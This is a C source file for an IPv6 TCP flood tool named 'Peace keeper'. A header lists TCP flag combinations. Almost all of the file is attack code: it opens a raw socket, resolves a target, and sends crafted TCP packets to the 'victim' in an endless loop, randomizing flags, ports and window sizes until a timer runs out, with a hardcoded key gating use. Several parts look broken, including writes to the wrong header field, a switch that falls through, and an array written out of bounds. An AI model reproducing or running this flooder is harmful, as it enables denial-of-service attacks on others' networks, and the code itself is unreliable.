/*                   .ed"""" """$$$$be.                 FLAG LIST:       1 = FIN
                   -"           ^""**$$$e.                               2 = SYN
                 ."                   '$$$c                              3 = FIN+SYN
                /                      "4$$b                             4 = RST
               d  3                      $$$$                            5 = RST+FIN
               $  *                   .$$$$$$                            6 = RST+SYN
              .$  ^c           $$$$$e$$$$$$$$.                           7 = RST+SYN+FIN
              d$L  4.         4$$$$$$$$$$$$$$b                           8 = PUSH
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$                           9 = PUSH+FIN
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$                          10 = PUSH+SYN
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c              11 = PUSH+SYN+FIN
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.              12 = PUSH+RST
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$             13 = PUSH+RST+FIN
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""              14 = PUSH+RST+SYN
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"               15 = PUSH+RST+SYN+FIN
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"                     16 = ACK
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"                       17 = ACK+FIN
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"                          18 = ACK+SYN
                  "$   "%*ebJLzb$e$$$$$b $P"                            19 = ACK+SYN+FIN
                    %..      4$$$$$$$$$$ "                              20 = ACK+RST
                     $$$e   z$$$$$$$$$$%                                21 = ACK+RST+FIN
                      "*$c  "$$$$$$$P"                                  22 = ACK+RST+SYN
                       ."""*$$$$$$$$bc                                  23 = ACK+RST+SYN+FIN
                    .-"    .$***$$$"""*e.                               24 = ACK+PUSH
                 .-"    .e$"     "*$c  ^*b.                             25 = ACK+PUSH+FIN
          .=*""""    .e$*"          "*bc  "*$e..                        26 = ACK+PUSH+SYN
        .$"        .z*"               ^*$e.   "*****e.                  27 = ACK+PUSY+SYN+FIN
        $$ee$c   .d"                     "*$.        3.                 28 = ACK+PUSH+RST
        ^*$E")$..$"                         *   .ee==d%                 29 = ACK+PUSH+RST+FIN
           $.d$$$*                           *  J$$$e*                  30 = ACK+PUSH+RST+SYN
            """""                              "$$$"                    31 = ACK+PUSH+RST+SYN+FIN
Peace keeper: V 6.0 - For IPv6.                                         32 = Randomized flags set in an array.
The traditional way of keeping the peace amongst the crowd.             33 = Digital Gangsta Stomper (special flags)
By darkness@efnet
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <stdbool.h>

#define ENDIAN_LITTLE

int rawsock = 0;
unsigned int start;
unsigned long long packets = 0;
unsigned short databytes = 0;
static struct sockaddr_in6 ss;

// TCP stuff
unsigned long a_flags[11];

struct tcphdr2
{
    unsigned short th_sport;       /* source port */
    unsigned short th_dport;       /* destination port */
    unsigned int th_seq;           /* sequence number */
    unsigned int th_ack;           /* acknowledgement number */
    unsigned char th_x2 : 4;         /* (unused) */
    unsigned char th_off : 4;        /* data offset */
    unsigned char th_flags;
    unsigned short th_win;         /* window */
    unsigned short th_sum;         /* checksum */
    unsigned short th_urp;         /* urgent pointer */
};

/*struct pshdr
{
    unsigned int src;
    unsigned int dst;
}*/

int lookup6(char* addr)
{
    struct addrinfo hints, * res;
    int error;

    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    error = getaddrinfo(addr, NULL, &hints, &res);

    if (error)
    {
        fprintf(stderr, "%s - error resolving\n", addr);
        return 1;
    }

    memcpy(&ss, res->ai_addr, res->ai_addrlen);
    freeaddrinfo(res);

    return 0;
}

void handle_exit()
{
    printf("\n-> Flood completed, %u packets sent, %zu seconds, %zu packets/sec\n", packets, time(NULL) - start, packets / (time(NULL) - start));
    exit(0);
}

void attack(unsigned short dstport, unsigned short srcport, unsigned short flags, unsigned short winsize, unsigned int ttime)
{
    int sockfd, retval, offset = 8;
    unsigned char packet[128];
    struct tcphdr2* tcp = (struct tcphdr2*)packet;

    setsockopt(rawsock, IPPROTO_IPV6, IPV6_CHECKSUM, &offset, sizeof(offset));

    tcp->th_off = 5;
    tcp->th_urp = 0;
    tcp->th_win = htons(winsize);

    if (flags == 32)
    {
        printf("TCP Flag Randomization [✔️] ");
        a_flags[1] = 16; // ACK
        a_flags[2] = 2; // SYN
        a_flags[3] = 4; // RST
        a_flags[4] = 1; // FIN
        a_flags[5] = 0; // NOF
        a_flags[6] = 8; // PSH
        a_flags[7] = 18; // SYN+ACK
        a_flags[8] = 32; // URG
        a_flags[9] = 64; // ECE/ECN
        a_flags[10] = 128; // CWR
    }

    if (flags == 33)
    {
        printf("Digital Gangsta Stomper [✔️] ");
        a_flags[1] = 16;     // ACK
        a_flags[2] = 18;     // SYN+ACK
        a_flags[3] = 16;     // ACK
        a_flags[4] = 4;      // RST
        a_flags[5] = 2;      // SYN
        a_flags[6] = 16;     // ACK
        a_flags[7] = 16;     // ACK
        a_flags[8] = 16;     // ACK
        a_flags[9] = 16;     // ACK
        a_flags[10] = 16;     // ACK
        a_flags[11] = 1;      // FIN
    }

    if (srcport == 1 || dstport == 1)
        printf("Ephemeral Port Randomization [✔️] ");

    tcp->th_flags = flags;
    tcp->th_sport = htons(srcport);
    tcp->th_dport = htons(dstport);

    /* Start the attack loop */
    while (true)
    {

        /* If 32 or 33 is specified as a flag, randomize from the chosen flag array */
        if (flags == 32)
        {
            tcp->th_flags = a_flags[(rand() % 10) + 1];
        }
        else if (flags == 33)
        {
            tcp->th_flags = a_flags[(rand() % 11) + 1];
        }
        // Set ACK and SEQ accordingly.
        switch (tcp->th_flags)
        {
        case 2:
        {
            tcp->th_flags = htonl(0);
            tcp->th_flags = htonl(0);
        }
        default:
        {
            tcp->th_flags = htonl(rand());
            tcp->th_flags = htonl(rand());
        }
        }
        /* Randomized win sizes. */
        if (winsize == 1)
        {
            tcp->th_win = htons((rand() % 40000) + 25535);
        }
        /* Random source ports. */
        if (srcport == 0)
        {
            tcp->th_sport = htons((rand() % 65534) + 1);
        }
        else if (srcport == 1)
        {
            tcp->th_sport = htons(((rand() % 16383) + 49152));
        }
        /* Random destination ports. */
        if (dstport == 0)
        {
            tcp->th_dport = htons((rand() % 65534) + 1);
        }
        else if (dstport == 1)
        {
            tcp->th_dport = htons(((rand() % 16383) + 49152));
        }
        /* Send the packet to your victim */
        sendto(rawsock, packet, sizeof(struct tcphdr2), 0, (struct sockaddr*)&ss, sizeof(struct sockaddr_in6));
        /* Increment the number of packets sent after a successful iteration */
        packets++;
        /* Attack timer check */
        if (time(NULL) - start >= ttime)
            handle_exit();
    }
}

int main(int argc, char** argv)
{
    unsigned int ttime;
    unsigned short dstport, srcport, winsize;
    unsigned char flags;

    /* parse arguments */
    if (argc < 6)
    {
        printf("-> The supreme art of war is to subdue the enemy without fighting. - Peace Keeper.\n");
        printf("-> usage: %s <key> <dest> <destport: 0> <srcport: 0> <flags: 32> <winsize: 1> <time: seconds>\n", argv[0]);
        exit(0);
    }

    if (strcmp(argv[1], "29A"))
    {
        printf("-> Ah ah ah! You didn't say the magic word!\n");
        exit(0);
    }

    /* allocate socket */
    rawsock = socket(AF_INET6, SOCK_RAW, IPPROTO_TCP);

    if (rawsock <= 0)
    {
        printf("Error opening raw socket\n");
        exit(-1);
    }

    lookup6(argv[2]);
    dstport = atoi(argv[3]);
    srcport = atoi(argv[4]);
    flags = atoi(argv[5]);
    winsize = atoi(argv[6]);
    ttime = atoi(argv[7]);

    signal(SIGINT, handle_exit);
    signal(SIGTERM, handle_exit);
    signal(SIGQUIT, handle_exit);

    start = time(NULL);

    attack(dstport, srcport, flags, winsize, ttime);
}